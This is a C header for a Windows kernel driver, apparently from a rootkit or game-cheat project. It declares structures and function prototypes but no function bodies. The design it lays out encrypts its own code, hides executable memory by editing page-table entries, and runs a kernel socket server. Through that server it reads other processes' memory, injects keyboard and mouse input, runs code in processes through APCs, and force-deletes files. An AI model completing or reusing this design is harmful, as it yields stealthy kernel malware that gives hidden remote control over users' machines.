#pragma once

#include "INI_CODE_NEED.h"



#ifdef DEBUG
#define LOG_DEBUG_CODE(format,...) 	fNtos->DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL,format,__VA_ARGS__);
#else
#define LOG_DEBUG_CODE(format,...)  //fNtos->DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL,format,__VA_ARGS__);
#define LOG_DEBUG_TIME(format,...)  fNtos->DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL,format,__VA_ARGS__);
#endif

#define WSK_MAX 130
#define WSK_T_0 128


typedef	struct _UnLoader_FN {
	KEVENT UnLoadEvent;
	LPCWSTR str;
	PVOID _pGData;
}UnLoader_FN;

typedef struct _HANDLE_TABLE_ENTRY
{
	union
	{
		VOID* Object;                                                       //0x0
		ULONG ObAttributes;                                                 //0x0
		struct _HANDLE_TABLE_ENTRY_INFO* InfoTable;                         //0x0
		ULONG Value;                                                        //0x0
	};
	union
	{
		ULONG GrantedAccess;                                                //0x4
		struct
		{
			USHORT GrantedAccessIndex;                                      //0x4
			USHORT CreatorBackTraceIndex;                                   //0x6
		};
		ULONG NextFreeTableEntry;                                           //0x4
	};
}HANDLE_TABLE_ENTRY, * PHANDLE_TABLE_ENTRY;

typedef struct _HANDLE_TABLE_FREE_LIST
{
	ULONG_PTR FreeListLock;
	HANDLE_TABLE_ENTRY FirstFreeHandleEntry;
	HANDLE_TABLE_ENTRY LastFreeHandleEntry;
	int HandleCount;
	ULONG32 HighWaterMark;
}HANDLE_TABLE_FREE_LIST, * PHANDLE_TABLE_FREE_LIST;

typedef struct _HANDLE_TRACE_DB_ENTRY
{
	CLIENT_ID ClientId;
	HANDLE Handle;
	ULONGLONG Type;
	PVOID StackTrace;
} HANDLE_TRACE_DB_ENTRY, * PHANDLE_TRACE_DB_ENTRY;

typedef struct _HANDLE_TRACE_DEBUG_INFO
{
	int RefCount;
	ULONG32 TableSize;
	ULONGLONG BitMaskFlags;
	FAST_MUTEX CloseCompactionLock;
	ULONGLONG CurrentStackIndex;
	HANDLE_TRACE_DB_ENTRY TraceDb;
} HANDLE_TRACE_DEBUG_INFO, * PHANDLE_TRACE_DEBUG_INFO;
typedef struct _HANDLE_TABLE
{
	ULONG NextHandleNeedingPool;
	INT32 ExtraInfoPages;
	ULONGLONG TableCode;
	PEPROCESS QuotaProcess;
	LIST_ENTRY HandleTableList;
	ULONG UniqueProcessId;
	ULONG Flags;
	ULONG_PTR HandleContentionEvent;
	ULONG_PTR HandleTableLock;
	HANDLE_TABLE_FREE_LIST FreeLists;
	HANDLE_TRACE_DEBUG_INFO DebugInfo;
} HANDLE_TABLE, * PHANDLE_TABLE;









typedef struct _LDR_DATA_TABLE_ENTRY
{
	LIST_ENTRY    InLoadOrderLinks;
	LIST_ENTRY    InMemoryOrderLinks;
	LIST_ENTRY    InInitializationOrderLinks;
	PVOID            DllBase;
	PVOID            EntryPoint;
	ULONG            SizeOfImage;
	UNICODE_STRING    FullDllName;
	UNICODE_STRING     BaseDllName;
	ULONG            Flags;
	USHORT            LoadCount;
	USHORT            TlsIndex;
	PVOID            SectionPointer;
	ULONG            CheckSum;
	PVOID            LoadedImports;
	PVOID            EntryPointActivationContext;
	PVOID            PatchInformation;
	LIST_ENTRY    ForwarderLinks;
	LIST_ENTRY    ServiceTagLinks;
	LIST_ENTRY    StaticLinks;
	PVOID            ContextInformation;
	ULONG64            OriginalBase;
	LARGE_INTEGER    LoadTime;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;


#define UNWIND_HISTORY_TABLE_SIZE 12

typedef struct _RUNTIME_FUNCTION {
	ULONG BeginAddress;
	ULONG EndAddress;
	ULONG UnwindData;
} RUNTIME_FUNCTION, * PRUNTIME_FUNCTION;

typedef struct _UNWIND_HISTORY_TABLE_ENTRY {
	ULONG64 ImageBase;
	PRUNTIME_FUNCTION FunctionEntry;
} UNWIND_HISTORY_TABLE_ENTRY, * PUNWIND_HISTORY_TABLE_ENTRY;

typedef struct _UNWIND_HISTORY_TABLE {
	ULONG Count;
	UCHAR Search;
	ULONG64 LowAddress;
	ULONG64 HighAddress;
	UNWIND_HISTORY_TABLE_ENTRY Entry[UNWIND_HISTORY_TABLE_SIZE];
} UNWIND_HISTORY_TABLE, * PUNWIND_HISTORY_TABLE;


typedef struct _MemoryMDL {
	PMDL pMdl;
	PVOID Buffer;
	PVOID MapBuffer;
	DWORD Flags;
	NTSTATUS status;
}MemoryMDL,* PMemoryMDL;

typedef struct _Memory_Exe_Info {
	LIST_ENTRY Link;
	PVOID Ptr;
	DWORD nPageSize;
	DWORD Flags;
	MMPTE* pMpte;
}Memory_Exe_Info;

typedef struct _MEMORY_FLAGS {
	PVOID Ptr;
	MMPTE* pMpte;
	PVOID ExePtr;
	DWORD Flags;
	SIZE_T Size;
	Memory_Exe_Info* MemoryExePtr;
}MEMORY_FLAGS;


typedef struct _MEMORY_DATA_FLAGS {
	PVOID Ptr;
	MMPTE* pMpte;
	PVOID ExePtr;
	DWORD Flags;
	SIZE_T Size;
	Memory_Exe_Info* MemoryExePtr;
}MEMORY_DATA_FLAGS;

typedef DWORD64(NTAPI* _Kernel_SELFCALL)(PVOID pGlobal, ...);

typedef struct _CODE_CALL {
	PVOID Ptr;   // 保存的数据指针 
	DWORD Size;  // 函数的长度
	DWORD MaxSize;
	SIZE_T nPageSize;
	DWORD Sgin;  // 函数解密签名
	_Kernel_SELFCALL  SelfTradition;
}CODE_CALL;


typedef unsigned int (*__hEncrypt)(PVOID pGData, unsigned int RandSgin, void* pDate, unsigned int Size);

typedef void (*__hEncrypt_DEC)(PVOID pGData, unsigned int RandSgin, void* pDate, unsigned int Size);

typedef void (*_SetAddressValidPte)(PVOID pGData, PVOID Ptr, DWORD nSize, MMPTE* Flags);

typedef PEPROCESS(*_GetProcessEprocess)(PVOID _pGData, HANDLE PID);

unsigned int _hEncrypt(PVOID pGData, unsigned int RandSgin, void* pDate, unsigned int Size);

void _hEncrypt_DEC(PVOID pGData, unsigned int RandSgin, void* pDate, unsigned int Size);

void _hEncrypt_DEC_V(PVOID pGData, unsigned int RandSgin, void* pDate, unsigned int Size);




PEPROCESS GetProcessEprocess(PVOID _pGData, HANDLE PID);

inline PVOID  LoadMemoryToUser(PVOID pGData, MemoryMDL* pMem, PVOID addr,
	DWORD nSize, KPROCESSOR_MODE Mode, ULONG Protect);

inline VOID FreeMemoryMDL(PVOID pGData, MemoryMDL* pMem);

PVOID ExAllocateFunctionMemoryV(PVOID _pGData, CODE_CALL* pCodeCall, PMDL* pMdl);

PVOID ExAllocateFunctionMemoryA(PVOID _pGData, CODE_CALL* pCodeCall);


typedef int SOCKET;

MEMORY_FLAGS ExAllocateFunctionMemory(PVOID _pGData, SOCKET s, CODE_CALL* pCodeCall);

 BOOLEAN ExFreeFunctionMemory(PVOID _pGData, SOCKET s, MEMORY_FLAGS* Flags);


PVOID ExAllocateFunctionMemoryApc(PVOID _pGData, CODE_CALL* pCodeCall);


typedef VOID(NTAPI* _PollingTimer)(PKDPC pDpc, PVOID pContext, PVOID SysArg1, PVOID SysArg2);

typedef VOID(NTAPI* _PollingExTimer)(_In_ PEX_TIMER Timer,_In_opt_ PVOID Context);

typedef VOID(* _PollingWorker)(PVOID pContext);



typedef	struct _SELF_F_ARRY {
	CODE_CALL LoadMemoryToUser;
	CODE_CALL FreeMemoryMDL;
	CODE_CALL SafeMemory;
	CODE_CALL FindProcessID;
	CODE_CALL Get_Win32k_Process_Explorer;
	CODE_CALL SetAddressExecute;
	CODE_CALL _hEncrypt;
	CODE_CALL _hEncrypt_DEC;
	CODE_CALL _hEncrypt_DEC_V;
	CODE_CALL PollingTimer;
	CODE_CALL PollingWorker;
	CODE_CALL PollingExTimer;
	CODE_CALL AcceptFromEx;
	CODE_CALL IO_COMPLETION_ROUTINE_Ex;
	CODE_CALL SendRecvFromEx;
	CODE_CALL FlushWskAccept_SendRecvEx;

	CODE_CALL hBufferSocket;
	CODE_CALL IOSocketBuffer;
	CODE_CALL sendEncrypt;
	CODE_CALL Brother_Memory;
	CODE_CALL Brother_Process;
	CODE_CALL Brother_Window;
	CODE_CALL Brother_Moudle;
	CODE_CALL Brother_File;
	CODE_CALL Brother_KeyBoard;

	CODE_CALL MmCopyMemoryV;

	CODE_CALL MmGetPhysicalAddressSelf;

	CODE_CALL FindWindowW;

	CODE_CALL RunApc;
	CODE_CALL RunApcNo;

	CODE_CALL ACCEPT_ROUTINE;
	CODE_CALL RECV_SEND_ROUTINE;

	CODE_CALL GetModuleBaseWow64;
	CODE_CALL RunApcRunCode;

	CODE_CALL FindProcessHandle;

	CODE_CALL _WORKER_THREAD_ROUTINE;
	CODE_CALL _Work_Memory;

	CODE_CALL RunApcSocketBuffer;
	CODE_CALL RunApcRunCodeDirect;

	CODE_CALL SetAddressValidPte;
	CODE_CALL ExAllocateFunctionMemory;
	CODE_CALL ExAllocateFunctionMemoryApc;
	CODE_CALL GetProcessEprocess;


	CODE_CALL FindProcessID8;


	CODE_CALL   FD_SetFileCompletion;
	CODE_CALL	FD_OpenFile;
	CODE_CALL	FD_StripFileAttributes;
	CODE_CALL	FD_DeleteFile;
	CODE_CALL	ForceDeleteFile;

	CODE_CALL   QueryDosDeviceW;
	CODE_CALL	DeviceDosPathToNtPath;
	CODE_CALL	UnLoadDriver_Mother;

}SELF_F_ARRY;

typedef struct _CODE_UNICODE_STRING {
	PVOID Ptr;   // 保存的数据指针 
	DWORD64 Size;  // 函数的长度
	DWORD64 MaxSize; //文本
	DWORD Sgin;  // 函数解密签名
}CODE_UNICODE_STRING;


typedef struct _CODE_ANSI_STRING {
	char * Ptr;   // 保存的数据指针 
	DWORD64 Size;  // 函数的长度
	DWORD64 MaxSize; //文本
	DWORD Sgin;  // 函数解密签名
}CODE_ANSI_STRING;

typedef	struct _SELF_UNICODE_STRING_ARRY {
	CODE_UNICODE_STRING Explorer;
	CODE_UNICODE_STRING Map_Timer;
	CODE_UNICODE_STRING WsWs;
	CODE_UNICODE_STRING ImagePath;
	CODE_UNICODE_STRING AA;
}SELF_UNICODE_STRING_ARRY;


typedef	struct _SELF_STRING_ARRY {
	CODE_ANSI_STRING Explorer;
	CODE_ANSI_STRING Csrss;
	CODE_ANSI_STRING Map_Timer;
	CODE_ANSI_STRING Line_Ptr;
	CODE_ANSI_STRING Line_Ptr_DWORD;
	CODE_ANSI_STRING Line_Ptr_DWORD_DWORD;
	CODE_ANSI_STRING Line_Ptr_WS;
	CODE_ANSI_STRING SendLenth;
	CODE_ANSI_STRING Line_Ptr_DWORD_DWORD_ExAllocate;
}SELF_STRING_ARRY;

typedef	struct _Windows_Buffer_Explorer{
	PVOID Win32k_Process_Explorer_Buffer;
	HANDLE Win32k_Process_Explorer;
	HANDLE Win32k_Process_Csrss;
}Windows_Buffer_Explorer;



//#define  _PollingExTimer EXT_CALLBACK;

typedef struct _Map_Timer {
	PEX_TIMER ExTimer;
	_PollingExTimer PollingExTimer;
	EXT_SET_PARAMETERS TimerParameters;
	EXT_DELETE_PARAMETERS Delete;
	KTIMER Timer;
	_PollingTimer  PollingTimer;
	KDPC Dpc;
	LARGE_INTEGER Time;
}Map_Timer;



typedef struct _Map_Worker {
	WORK_QUEUE_ITEM Worker;
	_PollingWorker  PollingWorker;
	LARGE_INTEGER Time;
}Map_Worker;



#include <wsk.h>
#include "KsSocket/berkeley.h"

typedef int (*_hBufferWsk)(PVOID pGData, SOCKET s, char* pBuffer, uint32_t nLen);


typedef struct tagRECTK
{
	LONG    left;
	LONG    top;
	LONG    right;
	LONG    bottom;
} RECTK, * LPRECTK;

typedef struct tagMSGK {
	HWND hWnd;
	UINT Msg;
	WPARAM wParam;
	LPARAM lParam;
} MSGK, * LPMSGK;

#pragma pack(push,8)
typedef struct _KETBD_EVENT
{
	BYTE bVk;
	BYTE bScan;
	DWORD dwFlags;
	ULONG_PTR dwExtraInfo;
}KETBD_EVENT;

typedef struct _MOUSE_EVENT
{
	DWORD dwFlags;
	DWORD dx;
	DWORD dy;
	DWORD dwData;
	ULONG_PTR dwExtraInfo;
}MOUSE_EVENT;

//()

#pragma pack(pop)

typedef struct  _F_WINDOWS {
	UNICODE_STRING lpClassName;
	UNICODE_STRING lpWindowName;
	HWND Hwnd;
}F_WINDOWS;

typedef struct  _F_RECT {
	RECTK * pRect;
	HWND Hwnd;
}F_RECT;

typedef struct  _F_POINT {
	POINT* pPoint;
	HWND Hwnd;
}F_POINT;

typedef struct  _F_EVENT {
	DWORD Event[10];
}KF_EVENT;

typedef struct  _F_MOUDLE {
	//UNICODE_STRING name;
	LPCWSTR pUnicodeStr;
	HANDLE PID;
}F_MOUDLE;

typedef struct  _F_PROCESS_PID {
	LPCWSTR pUnicodeStr;
}F_PROCESS_PID;



typedef struct  _WORKER_THREAD_INFO {
	WORK_QUEUE_ITEM WorkQueueItem;
	PWORKER_THREAD_ROUTINE WorkRoutine;
	PVOID pGData;
	SOCKET s;
	PVOID Buffer;
	DWORD Flags;
}WORKER_THREAD_INFO;


typedef struct  _APC_CALLBACK_INFO {
	PVOID pGData;
	SOCKET s;
	DWORD IOMajor;
	LPIOINFO pInfo;
	PVOID rBuffer;
}APC_CALLBACK_INFO;

typedef struct  _WORKER_T_INFO {
	WORK_QUEUE_ITEM WorkQueueItem;
	PWORKER_THREAD_ROUTINE WorkRoutine;
	PVOID pGData;
	SOCKET s;
	DWORD IOMajor;
	LPIOINFO pInfo;
	PVOID rBuffer;
}WORKER_T_INFO;


typedef struct _COMPLETION_ROUTINE_INFO {
	LIST_ENTRY Link;
	PIO_COMPLETION_ROUTINE pCall_back;
	KEVENT RemoveEvent;
	LARGE_INTEGER Time;
}COMPLETION_ROUTINE_INFO, * PCOMPLETION_ROUTINE_INFO;

//WORKER_T_INFO
typedef struct _RUN_APC_ARG {
	KAPC Apc;
	SOCKET s;
	DWORD  RunCode;
	PVOID  _pGData;
	MEMORY_FLAGS _Run_Routine; //RunApcNo
	PMDL pMdlRunRoutine;
	void *  rBuffer;
	uint32_t  rLen;
	KEVENT Event;
	union {
		HWND Hwnd;
		F_RECT    fRect;
		F_POINT   fPoint;
		F_WINDOWS  fWindows;
		F_MOUDLE   fMod;
		F_PROCESS_PID FProcess;
		KF_EVENT fEvent;
		MSGK Msg;
		APC_CALLBACK_INFO RunApc;
	}u;
}RUN_APC_ARG;

typedef struct _LIST_SOCKET {
	LIST_ENTRY Link;
	SOCKET s;
	DWORD Type;
}LIST_SOCKET;

typedef struct _WSK_COMPLETION_ROUTINE {
	PVOID pGData;
	SOCKET s;
	DWORD Flags;
	PCOMPLETION_ROUTINE_INFO pComRouInfo;
}WSK_COMPLETION_ROUTINE, * PWSK_COMPLETION_ROUTINE;





typedef NTSTATUS(*_AcceptFromEx)(PVOID _pGData, SOCKET s);

typedef NTSTATUS(*_SendRecvFromEx)(PVOID _pGData, SOCKET s, WSK_BUF* pBuffer, DWORD Flags);

typedef int (*_sendEncrypt)(PVOID _pGData, SOCKET s, uint32_t Sgin, void* pBuffer, uint32_t nLen);

typedef PHYSICAL_ADDRESS(*_MmGetPhysicalAddressSelf)(PVOID _pGData, SOCKET s, PEPROCESS Process, PVOID VirtualMem, DWORD * pError);

typedef DWORD64(*_MmCopyMemoryV)(PVOID _pGData, SOCKET s, PEPROCESS Process, PVOID  _Dst, PVOID VirtualMem, SIZE_T _nSize, int Flags);

typedef BOOLEAN(*_SafeMemory)(PVOID _pGData, SOCKET s, PVOID adr, PVOID val, DWORD valSize, DWORD flags);














typedef struct _SOCKET_INFO_BUFFER {
	PVOID pRecvBuffer;
	WSK_BUF kRecvBuffer;
	PVOID pSendBuffer;
	WSK_BUF kSendBuffer;
}SOCKET_INFO_BUFFER;



typedef struct _SOCKET_INFO_BUFFER_LIST {
	LIST_ENTRY Link;
	PVOID pRecvBuffer;
	WSK_BUF kRecvBuffer;
	PVOID pSendBuffer;
	WSK_BUF kSendBuffer;
}SOCKET_INFO_BUFFER_LIST;

typedef struct _SOCKET_HANDLE_INFO {
	void* pGdata;
	int s;
	KEVENT hEvent;
}SOCKET_HANDLE_INFO;

typedef struct _SOCKET_INFO {
	PVOID pRecvBuffer;
	WSK_BUF kRecvBuffer;
	PVOID pSendBuffer;
	WSK_BUF kSendBuffer;
	
	NTSTATUS Status;
	LIST_ENTRY CallBackEntry;
	WSK_COMPLETION_ROUTINE pContext;
	LIST_SOCKET List;
	DWORD wKey;
	RUN_APC_ARG _RunApcArg[2];
	WORKER_THREAD_INFO Worker;
	WORKER_T_INFO TWorker;

	PVOID OnePage_Phy;
	PVOID TwoPage_Read;

	_MmGetPhysicalAddressSelf uMmGetPhysicalAddressSelf;

	LIST_ENTRY DpcMemory;
	LIST_ENTRY ApcMemory;

	KSPIN_LOCK MemoryLock;

	SOCKET_INFO_BUFFER_LIST* BufferInfo;
	LPVOID MemoryBuffer;

	SOCKET_HANDLE_INFO sHandleInfo;

}SOCKET_INFO;


typedef struct _WSK_SERVER_INFO {
	WSK_SERVER_INFO_BASE bWsk;
	SOCKET_INFO _SocketArry[129];
	PKNORMAL_ROUTINE _Normal_Routine;
	LIST_ENTRY ListSocketAccept;
	LIST_ENTRY ListSocketRecv;
	//LIST_ENTRY ListSocketSend;
	_hBufferWsk hBuffer;
	SOCKET s_Sever;
	KSPIN_LOCK DataMemoryLock;
	SOCKET_INFO_BUFFER_LIST SendRecvBuff;
	//SOCKET_INFO_BUFFER_LIST SendBuff;
}WSK_SERVER_INFO,* PWSK_SERVER_INFO;



typedef MEMORY_FLAGS (*_ExAllocateFunctionMemory)(PVOID _pGData, SOCKET s, CODE_CALL* pCodeCall);


typedef BOOLEAN(*_ExFreeFunctionMemory)(PVOID _pGData, SOCKET s, MEMORY_FLAGS* Flags);

typedef struct _Global_Data {
	NTOSKRNL_FUN fNtos;
	WIN32K_FUN fWin32k;
	SELF_F_ARRY SelfFArry;
	SELF_UNICODE_STRING_ARRY SelfUArry;
	SELF_STRING_ARRY SelfAArry;
	Windows_Buffer_Explorer bExplorer;


	MEMORY_FLAGS _UnLoader;



	CODE_CALL _hEncrypt;
	CODE_CALL _hEncrypt_DEC;
	CODE_CALL _hEncrypt_DEC_V;
	CODE_CALL SetAddressExecute;
	CODE_CALL _WORKER_THREAD_ROUTINE;
	CODE_CALL _Work_Memory;
	CODE_CALL RunApcNo;
	CODE_CALL IO_COMPLETION_ROUTINE_Ex;
	CODE_CALL ExAllocateFunctionMemory;
	CODE_CALL ExFreeFunctionMemory;

	CODE_CALL WORKER_THREAD_ROUTINE_ACCEPT_SEND_RECV;

	_ExFreeFunctionMemory FreeMemory;

	_ExAllocateFunctionMemory FAllocateMemory;

	_ExAllocateFunctionMemory FAllocateMemoryApc;

	DWORD64 PTE_BASE;

	Map_Timer Map_Timer[2];
	Map_Worker Map_Worker[2];
	DWORD Map_CurrentIndex;

	WSK_SERVER_INFO wsk;

	LARGE_INTEGER Time;

	LARGE_INTEGER KTime;

	LARGE_INTEGER sTime;

	LARGE_INTEGER DueTime;
	DWORD nCountSleep;
	DWORD nCount;


	DWORD offsetCLIENT_ID;
	DWORD OffsetApcState;
	DWORD offsetProcess;

	//Cid + 0x70
	DWORD offsetEthread_ThreadList;
	DWORD offsetEprocess_ThreadList;
	DWORD offsetKprocess_ProcessList;
	//MMPTE ValidPte[2];




	DWORD HandleMode;

	//PHYSICAL_ADDRESS LowestAcceptableAddress;
	//PHYSICAL_ADDRESS HighestAcceptableAddress;
	//PHYSICAL_ADDRESS BoundaryAddressMultiple;

}Global_Data;











DWORD64 hBufferSocket(PVOID pGData, SOCKET s, char* pBuffer, uint32_t nLen);

void SetAddressExecute(PVOID pGData, PVOID Ptr, DWORD nSize, DWORD Flags);

NTSTATUS NTAPI FindProcessHandle(PVOID pGData, STRING* AString, DWORD* pSize, HANDLE* ProcessArry);

NTSTATUS NTAPI FindProcessID(PVOID pGData, UNICODE_STRING* ProcessName, DWORD* pSize, DWORD* ProcessArry);

NTSTATUS IO_COMPLETION_ROUTINE_Ex(PDEVICE_OBJECT DeviceObject, PIRP Irp, PVOID Context);

NTSTATUS AcceptFromEx(PVOID _pGData , SOCKET s);

DWORD64 FlushWskAccept_SendRecvEx(PVOID _pGData);

VOID NTAPI  PollingTimer(PKDPC pDpc, PVOID pContext, PVOID SysArg1, PVOID SysArg2);

 VOID PollingExTimer(PEX_TIMER Timer, PVOID Context);

 VOID PollingWorker(PVOID Parameter);



// BOOLEAN InitializeFunCODE(CODE_CALL* pCodeC, PRUNTIME_FUNCTION pRunTime, DWORD64 ImageBase);

 BOOLEAN InitializeFunCODE_Encrypt(CODE_CALL* pCodeC, PRUNTIME_FUNCTION pRunTime, DWORD64 ImageBase);


BOOLEAN Initialize_SelfFunction(SELF_F_ARRY* pSelfFArry, DWORD64 DllBase);

BOOLEAN Initialize_Self_STRING(SELF_UNICODE_STRING_ARRY* pSelfUArry);

BOOLEAN Initialize_Self_ANSI_STRING(SELF_STRING_ARRY* pSelfAArry);

SOCKET create_server_socket(PWSK_SERVER_INFO wsk, uint16_t port);














// Wsk


NTSTATUS NTAPI WskInitialize(PWSK_SERVER_INFO wsk);

BOOLEAN IniHandleOffset(Global_Data* pGData);







































































//#include <tdikrnl.h>

